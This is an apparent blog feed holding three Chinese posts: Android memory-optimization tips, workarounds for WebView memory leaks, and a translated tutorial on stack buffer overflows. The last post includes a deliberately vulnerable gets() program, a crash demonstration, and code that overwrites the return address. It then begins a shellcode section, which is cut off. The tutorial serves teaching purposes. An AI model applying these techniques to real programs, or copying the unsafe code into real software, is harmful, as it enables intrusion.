<p>OOM：即OutOfMemoery，顾名思义就是指内存溢出了。内存溢出是指APP向系统申请超过最大阀值的内存请求，系统不会再分配多余的空间，就会造成OOM error。在我们Android平台下，多数情况是出现在图片不当处理加载的时候。</p>
<p>内存管理之道嘛，无非就是先理解并找出内存泄漏的原因，再基于这些反式去合理的编码，去防范进而避免内存开销过大的情形。学习如何合理的管理内存，最好先了解内存分配的机制和原理。只有深层次的理解了内部的原理，才能真正避免OOM的发生。但是本文就不介绍Jvm/Davilk内存分配的机制了，如有兴趣，请查看历史消息，以前做过题为《JVM运行时数据区域分析》的分享。</p>
<p>Android APP的所能申请的最大内存大小是多少，有人说是16MB，有人又说是24MB。这种事情，还是亲自用自己的手机测试下比较靠谱。测试方式也比较简单，Java中有个Runtime类，主要用作APP与运行环境交互，APP并不会为我们创建Runtime的实例，但是Java为我们提供了单例获取的方式Runtime.getRuntime()。通过maxMemory()方法获取系统可为APP分配的最大内存，totalMemory()获取APP当前所分配的内存heap空间大小。我手上有两部手机，一部Oppo find7，运行Color OS，实测最大内存分配为192MB；一部天语v9，运行小米系统，实测最大内存分配为100MB。这下看出点眉目了吧，由于Android是开源系统，不同的手机厂商其实是拥有修改这部分权限能力的，所以就造成了不同品牌和不同系统的手机，对于APP的内存支持也是不一样的，和IOS的恒久100MB是不同的。一般来说，手机内存的配置越高，厂商也会调大手机支持的内存最大阀值，尤其是现在旗舰机满天发布的情况下。但是开发者为了考虑开发出的APP的内存兼容性，无法保证APP运行在何种手机上，只能从编码角度来优化内存了。</p>
<p>下面我们逐条来分析Android内存优化的关键点。</p>
<p> 1、万恶的static</p>
<p>static是个好东西，声明赋值调用就是那么的简单方便，但是伴随而来的还有性能问题。由于static声明变量的生命周期其实是和APP的生命周期一样的，有点类似与Application。如果大量的使用的话，就会占据内存空间不释放，积少成多也会造成内存的不断开销，直至挂掉。static的合理使用一般用来修饰基本数据类型或者轻量级对象，尽量避免修复集合或者大对象，常用作修饰全局配置项、工具类方法、内部类。</p>
<p>2、无关引用</p>
<p>很多情况下，我们需求用到传递引用，但是我们无法确保引用传递出去后能否及时的回收。比如比较有代表性的Context泄漏，很多情况下当Activity 结束掉后，由于仍被其他的对象指向导致一直迟迟不能回收，这就造成了内存泄漏。这时可以考虑第三条建议。</p>
<p>3、善用SoftReference/WeakReference/LruCache</p>
<p>Java、Android中有没有这样一种机制呢，当内存吃紧或者GC扫过的情况下，就能及时把一些内存占用给释放掉，从而分配给需要分配的地方。答案是肯定的，java为我们提供了两个解决方案。如果对内存的开销比较关注的APP，可以考虑使用WeakReference，当GC回收扫过这块内存区域时就会回收；如果不是那么关注的话，可以使用SoftReference，它会在内存申请不足的情况下自动释放，同样也能解决OOM问题。同时Android自3.0以后也推出了LruCache类，使用LRU算法就释放内存，一样的能解决OOM，如果兼容3.0一下的版本，请导入v4包。关于第二条的无关引用的问题，我们传参可以考虑使用WeakReference包装一下。</p>
<p>4、谨慎handler</p>
<p>在处理异步操作的时候，handler + thread是个不错的选择。但是相信在使用handler的时候，大家都会遇到警告的情形，这个就是lint为开发者的提醒。handler运行于UI线程，不断处理来自MessageQueue的消息，如果handler还有消息需要处理但是Activity页面已经结束的情况下，Activity的引用其实并不会被回收，这就造成了内存泄漏。解决方案，一是在Activity的onDestroy方法中调用</p>
<p>handler.removeCallbacksAndMessages(null);取消所有的消息的处理，包括待处理的消息；二是声明handler的内部类为static。</p>
<p>5、Bitmap终极杀手</p>
<p>Bitmap的不当处理极可能造成OOM，绝大多数情况都是因这个原因出现的。Bitamp位图是Android中当之无愧的胖小子，所以在操作的时候当然是十分的小心了。由于Dalivk并不会主动的去回收，需要开发者在Bitmap不被使用的时候recycle掉。使用的过程中，及时释放是非常重要的。同时如果需求允许，也可以去BItmap进行一定的缩放，通过BitmapFactory.Options的inSampleSize属性进行控制。如果仅仅只想获得Bitmap的属性，其实并不需要根据BItmap的像素去分配内存，只需在解析读取Bmp的时候使用BitmapFactory.Options的inJustDecodeBounds属性。最后建议大家在加载网络图片的时候，使用软引用或者弱引用并进行本地缓存，推荐使用android-universal-imageloader或者xUtils，牛人出品，必属精品。前几天在讲《自定义控件（三） 继承控件》的时候，也整理一个，大家可以去Github下载看看。</p>
<p>6、Cursor及时关闭</p>
<p>在查询SQLite数据库时，会返回一个Cursor，当查询完毕后，及时关闭，这样就可以把查询的结果集及时给回收掉。</p>
<p>7、页面背景和图片加载</p>
<p>在布局和代码中设置背景和图片的时候，如果是纯色，尽量使用color；如果是规则图形，尽量使用shape画图；如果稍微复杂点，可以使用9patch图；如果不能使用9patch的情况下，针对几种主流分辨率的机型进行切图。</p>
<p>8、ListView和GridView的item缓存</p>
<p>对于移动设备，尤其硬件参差不齐的android生态，页面的绘制其实是很耗时的，findViewById也是蛮慢的。所以不重用View，在有列表的时候就尤为显著了，经常会出现滑动很卡的现象。具体参照历史文章《说说ViewHolder的另一种写法》</p>
<p>9、BroadCastReceiver、Service</p>
<p>绑定广播和服务，一定要记得在不需要的时候给解绑。</p>
<p>10、I/O流</p>
<p>I/O流操作完毕，读写结束，记得关闭。</p>
<p>11、线程</p>
<p>线程不再需要继续执行的时候要记得及时关闭，开启线程数量不易过多，一般和自己机器内核数一样最好，推荐开启线程的时候，使用线程池。</p>
<p>12、String/StringBuffer</p>
<p>当有较多的字符创需要拼接的时候，推荐使用StringBuffer。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>相信一步步走过来的Android从业者，每个人都会遇到OOM的情况。如何避免和防范OOM的出现，对于每一个程序员来说确实是一门必不可少的能力。今天我们就谈谈在Android平台下内存的管理之道，开始今天的主题之前，先再次回顾两个概念。<br>]]>
    
    </summary>
    
      <category term="Android" scheme="http://science09.github.io/tags/Android/"/>
    
      <category term="内存管理" scheme="http://science09.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android WebView内存泄漏]]></title>
    <link href="http://science09.github.io/2014/07/31/Android-WebView%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"/>
    <id>http://science09.github.io/2014/07/31/Android-WebView内存泄漏/</id>
    <published>2014-07-31T15:59:14.000Z</published>
    <updated>2015-09-10T13:17:52.000Z</updated>
    <content type="html"><![CDATA[<p>在这次开发过程中，需要用到webview展示一些界面，但是加载的页面如果有很多图片就会发现内存占用暴涨，并且在退出该界面后，即使在包含该 webview的Activity的destroy()方法中，使用webview.destroy();webview=null;对内存占回收用还是没有任何效果。有人说，一旦在你的xml布局中引用了webview甚至没有使用过，都会阻碍重新进入Application之后对内存的gc。包括使用 MapView有时一会引发OOM，几经周折在网上看到各种解决办法，在这里跟大家分享一下。但是到目前为止还没有找到根本的解决办法，网上也有说是 sdk的bug。但是不管怎么样，我们还是需要使用的。<br><a id="more"></a><br>要使用WebView不造成内存泄漏，首先应该做的就是不能在xml中定义webview节点，而是在需要的时候动态生成。即：可以在使用WebView 的地方放置一个LinearLayout类似ViewGroup的节点，然后在要使用WebView的时候，动态生成即：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebView      mWebView = <span class="keyword">new</span> WebView(getApplicationgContext()); </span><br><span class="line">LinearLayout mll      = findViewById(R.id.xxx); </span><br><span class="line">mll.addView(mWebView);</span><br></pre></td></tr></table></figure>
<p>然后一定要在onDestroy()方法中显式的调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>.onDestroy();</span><br><span class="line">      mWebView.removeAllViews();</span><br><span class="line">      mWebView.destroy()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意： new  WebView(getApplicationgContext()) ;必须传入ApplicationContext如果传入Activity的 Context的话，对内存的引用会一直被保持着。有人用这个方法解决了当Activity被消除后依然保持引用的问题。但是你会发现，如果你需要在 WebView中打开链接或者你打开的页面带有flash，获得你的WebView想弹出一个dialog，都会导致从 ApplicationContext到ActivityContext的强制类型转换错误，从而导致你应用崩溃。这是因为在加载flash的时候，系统 会首先把你的WebView作为父控件，然后在该控件上绘制flash，他想找一个Activity的Context来绘制他，但是你传入的是 ApplicationContext。后果，你可以晓得了哈。</p>
<p>于是大牛们就Activity销毁后还保持引用这个问题，提供了另一种解决办法：既然你不能给我删除引用，那么我就自己来吧。于是下面的这种方法诞生了：</p>
<p>（作者说这个方法是依赖android.webkit implementation有可能在最近的版本中失败）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setConfigCallback</span><span class="params">(WindowManager windowManager)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Field field = WebView.class.getDeclaredField(<span class="string">"mWebViewCore"</span>); </span><br><span class="line">        field = field.getType().getDeclaredField(<span class="string">"mBrowserFrame"</span>); </span><br><span class="line">        field = field.getType().getDeclaredField(<span class="string">"sConfigCallback"</span>); </span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">        Object configCallback = field.get(<span class="keyword">null</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == configCallback) &#123; </span><br><span class="line">            <span class="keyword">return</span>; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        field = field.getType().getDeclaredField(<span class="string">"mWindowManager"</span>); </span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">        field.set(configCallback, windowManager); </span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在Activity中调用上面的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState); </span><br><span class="line">    setConfigCallback((WindowManager)getApplicationContext().getSystemService(Context.WINDOW_SERVICE)); </span><br><span class="line">&#125; </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setConfigCallback(<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">super</span>.onDestroy(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该反射方法在我的实验中（2.3.6）确实有些用处，在应用内存占用到70M左右的时候会明显释放到50M或者60M然后的释放就有些缓慢，其实就是看不出来了。之前在没使用该方法的时候可能达到120M。</p>
<p>但是！！！我们的应用要求占用内存更低啊，这肿么拌？凉拌么？No。在各种纠结之后，终于找到了终极解决办法！！！该办法适用于我们的需求，在退出 WebView的界面之后，迅速回收内存。要问这个方法是什么，不要9999，不要8999，只要你仔细看好下面一句话：那就是为加载WebView的界 面开启新进程，在该页面退出之后关闭这个进程。</p>
<p>这一点说了之后，你懂了吧？<br>但是在这个其中，杀死自己进程的时候又遇到了问题，网上介绍的各种方法都不好使，<br>killBackgroundProcesses(getPackageName());各种不好用，最后使用System.exit(0);直接退出虚拟机（Android为每一个进程创建一个虚拟机的）。这个肯定不用纠结了，一旦退出，内存里面释放。听涛哥说QQ也是这么做。</p>
<p>最后英雄要问出处，附上大牛解说引起该问题的出处</p>
<p>这个泄漏出现在external/webkit/Source/WebKit/android/WebCoreSupport/UrlInterceptResponse.cpp.中。具体我自己真心没有深入研究。大家有兴趣的话，可以看看哈。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--- a/Source/WebKit/android/WebCoreSupport/UrlInterceptResponse.cpp </span><br><span class="line">+++ b/Source/WebKit/android/WebCoreSupport/UrlInterceptResponse.cpp </span><br><span class="line">@@ -<span class="number">63</span>,<span class="number">10</span> +<span class="number">63</span>,<span class="number">10</span> @@ <span class="keyword">public</span>: </span><br><span class="line">         JNIEnv* env = JSC::Bindings::getJNIEnv(); </span><br><span class="line">         <span class="comment">// Initialize our read buffer to the capacity of out. </span></span><br><span class="line">         <span class="keyword">if</span> (!m_buffer) &#123; </span><br><span class="line">-            m_buffer = env-&gt;NewByteArray(out-&gt;capacity()); </span><br><span class="line">-            m_buffer = (jbyteArray) env-&gt;NewGlobalRef(m_buffer); </span><br><span class="line">+            <span class="function">ScopedLocalRef&lt;jbyteArray&gt; <span class="title">buffer_local</span><span class="params">(env, env-&gt;NewByteArray(out-&gt;capacity()</span>))</span>; </span><br><span class="line">+            m_buffer = static_cast&lt;jbyteArray&gt;(env-&gt;NewGlobalRef(buffer_local.get())); </span><br><span class="line">         &#125; </span><br><span class="line">         <span class="keyword">int</span> size = (<span class="keyword">int</span>) env-&gt;CallIntMethod(m_inputStream, m_read, m_buffer); </span><br><span class="line">         <span class="keyword">if</span> (checkException(env) || size &lt; <span class="number">0</span>) </span><br><span class="line">             <span class="keyword">return</span>; </span><br><span class="line">         <span class="comment">// Copy from m_buffer to out.</span></span><br></pre></td></tr></table></figure>
<p>而且从这里了解 <a href="https://github.com/android/platform_external_webkit/commit/1e3e46a731730c02d916ea805ec4b20191509282" target="_blank" rel="external">这个bug的解决状态</a> 。</p>
<p>还有一个问题要说的，也是在WebView使用的时候出现的问题：WebView 中包含一个ZoomButtonsController，当使用 web.getSettings().setBuiltInZoomControls(true);启用该设置后，用户一旦触摸屏幕，就会出现缩放控制图 标。这个图标过上几秒会自动消失，但在3.0系统以上上，如果图标自动消失前退出当前Activity的话，就会发生ZoomButton找不到依附的 Window而造成程序崩溃，解决办法很简单就是在Activity的ondestory方法中调用 web.setVisibility(View.GONE);方法，手动将其隐藏，就不会崩溃了。在3.0一下系统上不会出现该崩溃问题，真是各种崩溃， 防不胜防啊！</p>
<p>最后还有内存泄漏的一些个建议：</p>
<p>In summary, to avoid context-related memory leaks, remember the following:</p>
<ul>
<li>Do not keep long-lived references to a context-activity (a reference to an activity should have the same life cycle as the activity itself)</li>
<li>Try using the context-application instead of a context-activity</li>
<li>Avoid non-static inner classes in an activity if you don’t control their life cycle, use a static inner class and make a weak reference to the activity inside</li>
<li>And remember that a garbage collector is not an insurance against memory leaks. Last but not least, we try to make such leaks harder to make happen whenever we can.</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>在这次开发过程中，需要用到webview展示一些界面，但是加载的页面如果有很多图片就会发现内存占用暴涨，并且在退出该界面后，即使在包含该 webview的Activity的destroy()方法中，使用webview.destroy();webview=null;对内存占回收用还是没有任何效果。有人说，一旦在你的xml布局中引用了webview甚至没有使用过，都会阻碍重新进入Application之后对内存的gc。包括使用 MapView有时一会引发OOM，几经周折在网上看到各种解决办法，在这里跟大家分享一下。但是到目前为止还没有找到根本的解决办法，网上也有说是 sdk的bug。但是不管怎么样，我们还是需要使用的。<br>]]>
    
    </summary>
    
      <category term="Android" scheme="http://science09.github.io/tags/Android/"/>
    
      <category term="webview" scheme="http://science09.github.io/tags/webview/"/>
    
      <category term="内存泄露" scheme="http://science09.github.io/tags/%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[缓冲区溢出攻击]]></title>
    <link href="http://science09.github.io/2014/07/31/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    <id>http://science09.github.io/2014/07/31/缓冲区溢出攻击/</id>
    <published>2014-07-31T15:24:42.000Z</published>
    <updated>2015-09-10T13:52:34.000Z</updated>
    <content type="html"><![CDATA[<p>缓冲区溢出出现在用户输入的相关缓冲区内，在一般情况下，这是现在的计算机和网络上的最大的安全隐患之一。这是因为在编程的层次上很容易出现这中问题，这对于不明白或是无法获得源代码的使用者来说是不可见的，很多的这种问题就会被利用。本文就是企图教会新手-C程序员，证明怎么利用一个溢出环境。<br><a id="more"></a></p>
<h4 id="1-内存">1.内存</h4><p>注：我这里的描述方式是在大多数计算机上内存是进程的组织者，但是它是依赖处理器体系结构的类型。这是一个x86的例子，同时也可以大致应用在sparc。</p>
<p>缓冲区溢出的攻击原理是不应该是重写随机输入和在进程中执行代码的内存的重写。要看在什么地方和怎么发生的溢出，让我们来看下内存是如何组织的。页面是使用自己相关地址的内存的一个部分，这就意味着内核的进程的初始化，这就没有必要知道在RAM中存储的物理地址。进程内存由下面三个部分组成：</p>
<p>代码段，在这一段代码中你的数据是通过汇编指令在处理器中执行的。该代码执行是非线性的，它可以跳过代码，跳跃，在某种条件下调用函数。以此，我们使用EIP指针，或是指针指令。其中EIP指向的地址总是包含下一个执行代码。</p>
<p>数据段，变量空间和动态缓冲器。</p>
<p>堆栈段，这是用来给函数传递变量的和和作为函数变量的空间。在栈的底部位于每一页的虚拟内存的尽头，同时向下增长。汇编命令PUSHL会增加到栈的顶部，POPL会从栈的顶部移除项目并且把它们放到寄存器中。要直接访问栈寄存器，在栈的顶部有栈顶指针ESP。</p>
<h4 id="2-函数">2.函数</h4><p>函数是一段代码段的代码，当被调用执行一个任务，之后返回执行的前一个主题。或是，把参数传递给函数，在汇编语言中，通常看起来是这样的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">memory address                       code</span><br><span class="line"><span class="number">0x8054321</span>               pushl $<span class="number">0x0</span></span><br><span class="line"><span class="number">0x8054322</span>                              call $<span class="number">0x80543a0</span> </span><br><span class="line"><span class="number">0x8054327</span>                              ret</span><br><span class="line"><span class="number">0x8054328</span>                              leave</span><br><span class="line">...</span><br><span class="line"><span class="number">0x80543a0</span>               popl %eax</span><br><span class="line"><span class="number">0x80543a1</span>                              addl $<span class="number">0x1337</span>,%eax</span><br><span class="line"><span class="number">0x80543a4</span>                              ret</span><br></pre></td></tr></table></figure>
<p>这会发生什么?主函数调用了function(0);</p>
<p>变量是0，主要把它压入栈中，同时调用该函数。该函数使用popl来获取栈中的变量。完成后，返回0x8054327。通常，主函数要把EBP寄存器压入栈中，主要是储存和在结束后在储存。这是帧指针的概念，即允许函数使用自己的偏移地址，在对付攻击时就变的很无趣了。因为函数将不会返回到原有的执行线程。</p>
<p>我们只需要知道栈。在顶部，我们有函数的内部缓冲区和变量。在此之后，有保存的EBP寄存器(32位，4个字节)，然后返回地址，是另外的4个字节。再往下，还有要传递给函数的参数，这对我们没有用。</p>
<p>在这种情况下，我们返回的地址是0x8054327。在函数被调用时，它就会自动的存储到栈中。如果代码中存在溢出的地方，这个返回值会被覆盖，并且指针指向下内存中的下一个位置。</p>
<h4 id="3-一个可以利用的程序实例">3.一个可以利用的程序实例</h4><p>让我们假设我们要利用的函数为：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">void lame (void) &#123; char small[30]; gets (small); printf("%s\n", small); &#125;</span><br><span class="line"></span><br><span class="line">main() &#123; lame (); return 0; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Compile and disassemble it:</span><br><span class="line"></span><br><span class="line"># cc -ggdb blah.c -o blah</span><br><span class="line"></span><br><span class="line">/tmp/cca017401.o: In function `lame':</span><br><span class="line"></span><br><span class="line">/root/blah.c:1: the `gets' function is dangerous and should not be used.</span><br><span class="line"></span><br><span class="line"># gdb blah</span><br><span class="line"></span><br><span class="line">/* short explanation: gdb, the GNU debugger is used here to read the</span><br><span class="line"></span><br><span class="line">   binary file and disassemble it (translate bytes to assembler code) */</span><br><span class="line"></span><br><span class="line">(gdb) disas main</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x80484c8 :       pushl  %ebp</span><br><span class="line">0x80484c9 :     movl   %esp,%ebp</span><br><span class="line">0x80484cb :     call   0x80484a0</span><br><span class="line">0x80484d0 :     leave</span><br><span class="line">0x80484d1 :     ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(gdb) disas lame</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function lame:</span><br><span class="line"></span><br><span class="line">/* saving the frame pointer onto the stack right before the ret address */</span><br><span class="line">0x80484a0 :       pushl  %ebp</span><br><span class="line">0x80484a1 :     movl   %esp,%ebp</span><br><span class="line"></span><br><span class="line">/* enlarge the stack by 0×20 or 32. our buffer is 30 characters, but the</span><br><span class="line">   memory is allocated 4byte-wise (because the processor uses 32bit words)</span><br><span class="line">   this is the equivalent to: char small[30]; */</span><br><span class="line"></span><br><span class="line">0x80484a3 :     subl   $0×20,%esp </span><br><span class="line"></span><br><span class="line">/* load a pointer to small[30] (the space on the stack, which is located</span><br><span class="line">   at virtual address 0xffffffe0(%ebp)) on the stack, and call</span><br><span class="line">   the gets function: gets(small); */</span><br><span class="line"></span><br><span class="line">0x80484a6 :     leal   0xffffffe0(%ebp),%eax</span><br><span class="line">0x80484a9 :     pushl  %eax</span><br><span class="line">0x80484aa :    call   0x80483ec</span><br><span class="line">0x80484af :    addl   $0×4,%esp</span><br><span class="line"></span><br><span class="line">/* load the address of small and the address of "%s\n" string on stack</span><br><span class="line">   and call the print function: printf("%s\n", small); */</span><br><span class="line"></span><br><span class="line">0x80484b2 :    leal   0xffffffe0(%ebp),%eax</span><br><span class="line">0x80484b5 :    pushl  %eax</span><br><span class="line">0x80484b6 :    pushl  $0x804852c</span><br><span class="line">0x80484bb :    call   0x80483dc</span><br><span class="line">0x80484c0 :    addl   $0×8,%esp</span><br><span class="line"></span><br><span class="line">/* get the return address, 0x80484d0, from stack and return to that address.</span><br><span class="line">   you don't see that explicitly here because it is done by the CPU as 'ret' */</span><br><span class="line"></span><br><span class="line">0x80484c3 :    leave</span><br><span class="line">0x80484c4 :    ret</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<h4 id="3-1_程序溢出">3.1 程序溢出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ./blah  </span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx    &lt;- user input</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line"># ./blah  </span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &lt;- user input</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line"># gdb blah core</span><br><span class="line">(gdb) info registers</span><br><span class="line">     eax:       0×24          36</span><br><span class="line">     ecx:  0x804852f   134513967</span><br><span class="line">     edx:        0×1           1  </span><br><span class="line">     ebx:   0x11a3c8     1156040  </span><br><span class="line">     esp: 0xbffffdb8 -1073742408  </span><br><span class="line">     ebp:   0×787878     7895160</span><br></pre></td></tr></table></figure>
<p>EBP是0x787878，这就意味我们已经写入了超出缓冲区输入可以控制的范围。0x78的x是十六进制的标志。该过程有32个字节的最大的缓冲器。我们已经在内存中写入了比用户输入更多的数据，因此重写EBP和返回值的地址是’xxxx’，这个过程会尝试在地址0x787878处重复执行，这就会导致段的错误。</p>
<h4 id="3-2_改变返回值地址">3.2 改变返回值地址</h4><p>让我们尝试利用这个程序来返回lame()，我们要改变返回值的地址从0x80484d0到0x80484cb，在内存中，我们有32字节的缓冲区空间|4个字节保存EBP|4个字节的RET。下面是一个很简单的程序，把4个字节的返回地址变成一个1个字节字符缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">char</span> buf[<span class="number">44</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;=<span class="number">40</span>;i+=<span class="number">4</span>)</span><br><span class="line">    *(<span class="keyword">long</span> *) &amp;buf[i] = <span class="number">0x80484cb</span>;</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor"># ret</span></span><br><span class="line">ËËËËËËËËËËË,</span><br><span class="line"><span class="preprocessor"># (ret;cat)|./blah</span></span><br><span class="line">test         &lt;- user input</span><br><span class="line">ËËËËËËËËËËË,test</span><br><span class="line">test         &lt;- user input</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
<p>我们在这里使用这个程序通过了函数两次。如果有溢出存在，函数的返回值地址是可以变的，从而改变程序的执行线程。</p>
<h4 id="4-_Shellcode">4. Shellcode</h4><p>为了简单，Shellcode使用简单的汇编指令，我们写在栈上，然后更改返回地址，使它返回到栈内。使用这个方法，我们可以我们可以把代码插入到一个脆弱的进程中，然后在栈中正确的执行它。所以，让我们通过插入的汇编代码来运行一个Shell。一个常见的调用命令是execve()，它加载和运行任意的二进制代码，终止执行当前的进程。联机界面给我的应用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">execve</span>  <span class="params">(<span class="keyword">const</span>  <span class="keyword">char</span>  *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv [], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;  </span><br><span class="line">Lets get the details of the system call from glibc2:  </span><br><span class="line"><span class="preprocessor"># gdb /lib/libc.so<span class="number">.6</span>  </span></span><br><span class="line">(gdb) disas execve  </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function execve:  </span><br><span class="line"><span 